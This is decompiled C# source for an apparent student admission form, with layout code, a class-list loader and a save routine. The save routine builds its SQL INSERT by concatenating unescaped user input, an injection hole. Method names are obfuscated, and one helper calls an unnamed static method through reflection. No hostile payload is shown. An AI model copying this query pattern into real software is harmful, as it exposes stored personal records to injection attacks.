		((ButtonBase)Button5).get_FlatAppearance().set_BorderSize(3);
		((ButtonBase)Button5).get_FlatAppearance().set_MouseOverBackColor(Color.MintCream);
		((ButtonBase)Button5).set_FlatStyle((FlatStyle)0);
		((Control)Button5).set_Location(new Point(449, 341));
		((Control)Button5).set_Name("Button5");
		((Control)Button5).set_Size(new Size(133, 29));
		((Control)Button5).set_TabIndex(22);
		((ButtonBase)Button5).set_Text("Upload Image");
		((ButtonBase)Button5).set_UseVisualStyleBackColor(false);
		((Control)TextBox9).set_Location(new Point(119, 207));
		((Control)TextBox9).set_Name("TextBox9");
		((Control)TextBox9).set_Size(new Size(221, 22));
		((Control)TextBox9).set_TabIndex(23);
		((Control)Label11).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label11).set_Location(new Point(2, 207));
		((Control)Label11).set_Name("Label11");
		((Control)Label11).set_Size(new Size(125, 22));
		((Control)Label11).set_TabIndex(22);
		Label11.set_Text("Parent Ph. No. ");
		Label11.set_TextAlign((ContentAlignment)16);
		((Control)TextBox8).set_Location(new Point(119, 267));
		((Control)TextBox8).set_Name("TextBox8");
		((Control)TextBox8).set_Size(new Size(221, 22));
		((Control)TextBox8).set_TabIndex(21);
		((Control)Label10).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label10).set_Location(new Point(2, 264));
		((Control)Label10).set_Name("Label10");
		((Control)Label10).set_Size(new Size(111, 25));
		((Control)Label10).set_TabIndex(20);
		Label10.set_Text("Course ");
		Label10.set_TextAlign((ContentAlignment)16);
		((Control)TextBox4).set_Location(new Point(119, 235));
		((Control)TextBox4).set_Name("TextBox4");
		((Control)TextBox4).set_Size(new Size(221, 22));
		((Control)TextBox4).set_TabIndex(19);
		((Control)Label9).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label9).set_Location(new Point(2, 235));
		((Control)Label9).set_Name("Label9");
		((Control)Label9).set_Size(new Size(87, 22));
		((Control)Label9).set_TabIndex(18);
		Label9.set_Text("E-mail Id ");
		Label9.set_TextAlign((ContentAlignment)16);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		ComboBox1.get_Items().AddRange(new object[2] { "Male", "Female" });
		((Control)ComboBox1).set_Location(new Point(335, 134));
		((Control)ComboBox1).set_Name("ComboBox1");
		((Control)ComboBox1).set_Size(new Size(105, 24));
		((Control)ComboBox1).set_TabIndex(17);
		((FileDialog)OpenFileDialog1).set_FileName("OpenFileDialog1");
		((ListControl)ComboBox3).set_FormattingEnabled(true);
		((Control)ComboBox3).set_Location(new Point(119, 297));
		((Control)ComboBox3).set_Name("ComboBox3");
		((Control)ComboBox3).set_Size(new Size(221, 24));
		((Control)ComboBox3).set_TabIndex(32);
		((Control)Label14).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label14).set_Location(new Point(2, 296));
		((Control)Label14).set_Name("Label14");
		((Control)Label14).set_Size(new Size(111, 25));
		((Control)Label14).set_TabIndex(31);
		Label14.set_Text("Class");
		Label14.set_TextAlign((ContentAlignment)16);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)0);
		((Form)this).set_BackColor(Color.MintCream);
		((Form)this).set_CancelButton((IButtonControl)(object)Button3);
		((Form)this).set_ClientSize(new Size(614, 465));
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_HelpButton(true);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("AddmisionForm");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Addmision FORM");
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	private void a7Y(object sender, EventArgs e)
	{
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		((Control)DateTimePicker1).set_Visible(true);
		((Control)ComboBox1).set_Visible(true);
		((Control)ComboBox2).set_Visible(true);
		Nn6.y6G();
		Nn6.cn.Open();
		Nn6.str = "select * from ClassDetail";
		Nn6.cmd = new SqlCommand(Nn6.str, Nn6.cn);
		Nn6.da.set_SelectCommand(Nn6.cmd);
		((DbDataAdapter)(object)Nn6.da).Fill(Nn6.ds, "ClassDetail");
		Nn6.cn.Close();
		Nn6.cn.Open();
		Nn6.str = "select * from ClassDetail";
		Nn6.cmd = new SqlCommand(Nn6.str, Nn6.cn);
		Nn6.da.set_SelectCommand(Nn6.cmd);
		((DbDataAdapter)(object)Nn6.da).Fill(Nn6.ds, "ClassDetail");
		checked
		{
			int num = Nn6.ds.Tables["ClassDetail"]!.Rows.Count - 1;
			int num2 = num;
			for (int i = 0; i <= num2; i++)
			{
				ComboBox3.get_Items().Add((object)Nn6.ds.Tables["ClassDetail"]!.Rows[i][1].ToString());
			}
			Nn6.cn.Close();
		}
	}

	private void q7K(object sender, EventArgs e)
	{
	}

	private void Dz6(object sender, EventArgs e)
	{
		TextBox11.set_Text(Conversions.ToString(checked(DateAndTime.get_Today().Date.Year - DateTimePicker1.get_Value().Year)));
	}

	private void Xg0(object sender, EventArgs e)
	{
	}

	private void t7H(object sender, EventArgs e)
	{
	}

	private void Hz0(object sender, EventArgs e)
	{
	}

	private void x8H(object sender, EventArgs e)
	{
	}

	private void g0H(object sender, EventArgs e)
	{
	}

	private void w2Y(object sender, EventArgs e)
	{
	}

	private void En5(object sender, EventArgs e)
	{
	}

	private void Go8(object sender, EventArgs e)
	{
	}

	public void r4A()
	{
		((TextBoxBase)TextBox1).Clear();
		((TextBoxBase)TextBox2).Clear();
		((TextBoxBase)TextBox3).Clear();
		((TextBoxBase)TextBox4).Clear();
		((TextBoxBase)TextBox5).Clear();
		((TextBoxBase)TextBox6).Clear();
		((TextBoxBase)TextBox7).Clear();
		((TextBoxBase)TextBox8).Clear();
		((TextBoxBase)TextBox9).Clear();
		((TextBoxBase)TextBox10).Clear();
		((TextBoxBase)TextBox11).Clear();
	}

	private void p5N(object sender, EventArgs e)
	{
		((Control)r6W7.Forms.SearchForm).Show();
		r6W7.Forms.SearchForm.TextBox1.set_Text(TextBox3.get_Text());
		r6W7.Forms.SearchForm.TextBox2.set_Text(TextBox1.get_Text());
		r6W7.Forms.SearchForm.TextBox3.set_Text(TextBox8.get_Text());
		r6W7.Forms.SearchForm.PictureBox1.set_Image(PictureBox1.get_Image());
	}

	private void s1A(object sender, EventArgs e)
	{
	}

	private void k2B(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		//IL_016d: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_037b: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a1: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		if (Operators.CompareString(TextBox1.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the name.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		else if (Operators.CompareString(TextBox2.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the address.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		else if (Operators.CompareString(TextBox3.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the PRN.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		else if (Operators.CompareString(TextBox4.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the Email.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		else if (Operators.CompareString(TextBox5.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the Mobile no.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		else if (Operators.CompareString(TextBox6.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the DOB.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		else if (Operators.CompareString(TextBox7.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the Gender.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		else if (Operators.CompareString(TextBox8.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the Course.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		else if (Operators.CompareString(TextBox9.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the Parent Phone.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		else if (Operators.CompareString(TextBox10.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the Doc.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		else if (Operators.CompareString(TextBox11.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please enter the Age.", (MsgBoxStyle)0, (object)null);
			num = 1;
		}
		try
		{
			if (num == 0)
			{
				Nn6.cn.Open();
				Nn6.str = "Insert into InformationForm values ('" + TextBox1.get_Text() + "','" + TextBox2.get_Text() + "'," + TextBox3.get_Text() + ",'" + TextBox4.get_Text() + "'," + TextBox5.get_Text() + "," + Conversions.ToString(DateTimePicker1.get_Value()) + ",'" + ComboBox1.get_Text() + "','" + ComboBox2.get_Text() + "'," + TextBox9.get_Text() + ",'" + TextBox10.get_Text() + "'," + TextBox11.get_Text() + "," + ComboBox3.get_Text() + ")";
				Nn6.cmd = new SqlCommand(Nn6.str, Nn6.cn);
				Nn6.da.set_InsertCommand(Nn6.cmd);
				Nn6.cmd.ExecuteNonQuery();
				Interaction.MsgBox((object)" Record Saved.", (MsgBoxStyle)0, (object)null);
				r4A();
				Nn6.cn.Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)" Record Not Saved.", (MsgBoxStyle)0, (object)null);
			Nn6.cn.Close();
			ProjectData.ClearProjectError();
		}
	}

	private void b4E(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	internal static string y2F(string Gy7)
	{
		Type type = (Type)Mi8.mDic[Mi8.T];
		return Conversions.ToString(type.InvokeMember(Gy7, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null));
	}

	private void Cz9(object sender, EventArgs e)
	{
	}

	private void b5W(object sender, EventArgs e)
	{
	}

	private void y8D(object sender, EventArgs e)
	{
	}
}
